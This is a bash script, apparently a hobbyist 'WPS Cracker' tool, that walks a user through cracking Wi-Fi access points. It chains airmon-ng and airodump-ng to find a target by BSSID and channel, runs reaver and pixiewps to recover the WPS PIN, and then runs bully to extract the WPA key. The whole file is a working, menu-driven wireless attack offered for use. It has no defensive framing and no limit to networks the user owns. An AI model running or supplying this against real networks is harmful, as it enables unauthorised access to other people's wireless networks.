#!/bin/bash
##################################
#Script by Hassan Waatmani       #
#Facebook.com/Waatmani           #
#Partners : OwElkoDev and X-Optix#
##################################
quest='Y'
while  [ $quest == 'Yes' ] || [ $quest == 'Y' ] || [ $quest == 'y' ] || [ $quest == 'yes' ];
do
 clear
# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White
Force='\033[0m'
echo -e "﻿$Red██╗    ██╗██████╗ ███████╗   $Green ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ "
sleep 0.1
echo -e "$Red██║    ██║██╔══██╗██╔════╝   $Green ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗"
sleep 0.1
echo -e "$Red██║ █╗ ██║██████╔╝███████╗   $Green ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝"
sleep 0.1
echo -e "$Red██║███╗██║██╔═══╝ ╚════██║   $Green ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗"
sleep 0.1
echo -e "$Red╚███╔███╔╝██║     ███████║   $Green ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║"
sleep 0.1
echo -e "$Red╚══╝╚══╝ ╚═╝     ╚══════╝    $Green ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ "
sleep 0.1  
echo -e $Cyan   "    +${Yellow}-------------------------------------------------------------------${Cyan}+${Yellow}"
sleep 0.1
echo -e "               |        ${Red} Edited${Yellow} By ${Purple} Hassan Waatmani ${Yellow}             |"
sleep 0.1
echo -e "               |      $Green Partners ${White}: ${Cyan}OwElkoDev${White} &&${Cyan} X-Optix${Yellow} 	 	 |" 
sleep 0.1
echo -e "               ${Cyan}+${Yellow}-------------------------------------------------${Cyan}+"
sleep 0.1
hassan=`whoami`
if [ "$hassan" != "root" ]
	then
		echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
		echo -e "${White}     | [${Red}!${White}] You need to launch the script as the root user , run it with  ${White}|"
		echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
		echo -e "${White}     | ${Red}                 \$${White}=> sudo ${Yellow}./${Green}WPS${White}-${Green}Cracker${White}.${Green}sh${White}                        |"
		echo -e "${White}     | ${Red}                 \$${White}=> sudo ${Blue}bash ${Green}WPS${White}-${Green}Cracker${White}.${Green}sh${White}                     |"
		echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
		echo ""
		echo ""
sleep 0.1
exit
else
echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
echo -e "${White}     | ${Yellow} ID ${White} |                   ${Purple}   Options                          ${White}     |"
echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Start cracking WPA KEY${Cyan} ${White} .                        		 |"
echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Green If you Have PKE then start Crackin $Red WPS PIN${White} .   		 |"
echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green ${Green}If you want to crack an acces point's key with${Cyan} WPS PIN${White} .   |"
echo -e "${White}     | ${Red}[${Yellow}04${Red}]${White} |$Green Exit${White} .${White}                                                     |"
echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
echo ""
echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
read menu
menu=`expr $menu + 0 2> /dev/null`
if test $menu == '1'
 then
	 
sleep 1

 airmon-ng

printf "${Green}Please select your interface ${Purple}Wlan0 Or Wlan1${Force} : "
read int

airmon-ng start $int

printf "${Green}Select The Monitor${Force} ${Blue}mon0 or mon1 or wlan1mon ..${Force} : "
read themon

printf "${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck, ${Cyan}Now Click Enter : "
read click

airodump-ng $themon


printf "                                                     ${Green}Step ${Red}1  ${Force}"
echo ""
sleep 1

printf "${Red}Please Enter ${Force} ${Green} The BSSID${Force} ${Red}Of Your target${Force} : "
read BSSID

printf "                                                     ${Green}Step ${Red}2  ${Force}"
echo ""
sleep 1

printf "${Red}Enter ${Force} ${Green}The Channel ${Force} ${Red}Of Your target${Force} : "
read Chane1

printf "                                                ${Puple}Ps :  ${Force}"
echo ""
sleep 1

printf "${Blue}if you connected to another ${Green}Wifi${Force} ${Blue}Please Disconnected ${Force} , ${Cyan}Now Click Enter: "
read Click
reaver -i $themon -b $BSSID -c $Chane1 -vv -K 1

printf "                                                     ${Green}Step ${Red}3  ${Force}"
echo ""
sleep 1


printf "${Blue}Enter ${Force} ${Puple} The Pke${Force} : "
read e

printf "                                                     ${Green}Step ${Red}4  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter${Force} ${Puple}E-Hash1${Force} "
read s

printf "                                                     ${Green}Step ${Red}5  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter ${Force} ${Puple}E-Hash2${Force} "
read z

printf "                                                     ${Green}Step ${Red}6  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter${Force} ${Puple}Pkr${Force} "
read r

printf "                                                     ${Green}Step ${Red}7  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter${Force} ${Puple}E-nonce${Force} "
read n

printf "                                                     ${Green}Step ${Red}8  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter ${Force} ${Puple}Authkey${Force} "
read auth

printf "                                                     ${Green}Step ${Red}9  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter${Force} ${Puple}R-nonce${Force} "
read m

clear
printf "                                                     ${Green}Step ${Red}10  ${Force}"

echo ""
sleep 1
printf "${Green}$Red Wait until the$Green PIN$Red is cracked,this may take few seconds ...$White"
pixiewps -f -e $e -s $s -z $z  -r $r -n $n -a $auth -m $m -b $BSSID -v 3  

echo " [*] BSSID : $BSSID "
printf "${Blue}Sorry pin not found , good luck next time${Force} "
sleep 1
echo""
printf " ${Blue}WPS Cracker By Hassan Waatmani ${Force} "

echo""
echo""

printf "              ${Green}Now Crack ${Force}${Green1}  The KEY WPA${Force}"
sleep 2

printf "                                                      ${Green}Step ${Red}11  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter ${Force} ${Green}PIN${Force} ${Red} That You cracked  ${Force} : "
read pin
sleep 1

printf "                                                     ${Puple}Ps :  ${Force}"
echo ""
sleep 1

printf "${Blue}if you connected to another ${Green}Wifi${Force} ${Blue}Please Disconnected ${Force}, ${Cyan}Now Click Enter : "
read Click

printf "                                     ${Green}Step ${Red}12  ${Force}"
echo ""
printf "$Red Wait until the$Green KEY WPA$Red is cracked,this may take few seconds ...$White"
echo""

bully -p $pin -b $BSSID -c $Chane1 -B -F  $themon

echo ""
printf "Congratulation , The process of${Green} Bully ${White} has completed${Green} successfully.\n" 

echo ""
printf "${Blue}Sorry WPA KEY not found , good luck next time.${Force}"  
read a
	 
elif test $menu == '2'
 then
 
sleep 1
printf "                                      ${Green}Step ${Red}1  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter Your ${Force} ${Purple}Pke${Force} : "
read e

printf "                                     ${Green}Step ${Red}2  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter Your${Force} ${Purple}E-Hash1${Force} : "
read s

printf "                                     ${Green}Step ${Red}3  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter Your${Force} ${Purple}E-Hash2${Force} : "
read z

printf "                                     ${Green}Step ${Red}4  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter Your${Force} ${Purple}Pkr${Force} : "
read r

printf "                                     ${Green}Step ${Red}5  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter Your ${Force} ${Purple}E-nonce${Force} : "
read n

printf "                                     ${Green}Step ${Red}6  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter Your ${Force} ${Purple}Authkey${Force} : "
read Auth

printf "                                     ${Green}Step ${Red}7  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter Your${Force} ${Purple}R-nonce${Force} : "
read m

printf "                                     ${Green}Step ${Red}8  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter Your ${Force} ${Purple}Bssid${Force} : "
read BSSID

clear
printf "                                     ${Green}Step ${Red}9  ${Force}"

echo ""
sleep 1
printf "$Red Wait until the$Green PIN$Red is cracked,this may take few seconds ...$White "
pixiewps -f -e $e -s $s -z $z  -r $r -n $n -a $Auth -m $m -b $BSSID -v 3 

echo " $BSSID "
printf "${Blue}Congratulation , The process of${Green} pixiewps ${White} has completed${Green} successfully.\n${Force}"
printf "${Blue}Sorry pin not found , good luck next time.${Force}"

elif test $menu == '3'
 then
 	

sleep 2

printf "                                                         ${Green}Step ${Red}1  ${Force}"
echo ""
sleep 1


printf "${Blue}Please Enter ${Force} ${Purple}The BSSID${Force} ${Red}Of Your target${Force} : "
read BSSID

printf "                                  			${Green}Step ${Red}2  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter ${Force} ${Purple}The Channel ${Force} ${Red}Of Your target${Force} :"
read Chane1

printf "                                  			${Green}Step ${Red}3  ${Force}"
echo ""
sleep 1

printf "${Blue}Enter Your ${Force} ${Purple}Pin${Force} : "
read pin
sleep 1

printf "                                  			${Green}Step ${Red}4  ${Force}"
echo ""
sleep 1

printf "${Blue}Select The Monitor${Force} ${Blue}mon0 or mon1 or wlan1mon ..${Force} : "
read themon
sleep 1

printf "                                  			${Green}Step ${Red}1  ${Force}"
echo ""
printf "${Blue}$Red Wait until the$Green WPA KEY$Red is cracked,this may take few seconds ...$White"
echo""
bully -p $pin -b $BSSID -c $Chane1 -B -F  $themon



printf "Congratulation , The process of${Green} Bully ${White} has completed${Green} successfully"
printf "${Blue}Sorry WPA KEY not found , good luck next time.${Force}"  
read a 	

elif test $menu == '4'
 then

   echo -e "$Blue WPS Cracker $White By$Yellow Hassan Waatmani"
echo ""
sleep 1
echo ""
echo -e "$Green Partners ${White}: ${Cyan}OwElkoDev${White} and ${Cyan} X-Optix${White} ."
echo ""
exit

else 
echo -e "${Red} Please Select your Choise${Force} :)";
fi
echo
echo -n -e " Back to menu? (${Green} Yes${Force} Or ${Red}No${Force}):";
read quest;
    
echo ""
sleep 1
echo ""
echo -e "$Green Partners ${White}: ${Cyan}OwElkoDev${White} and ${Cyan} X-Optix${White} ."
echo ""
fi
done

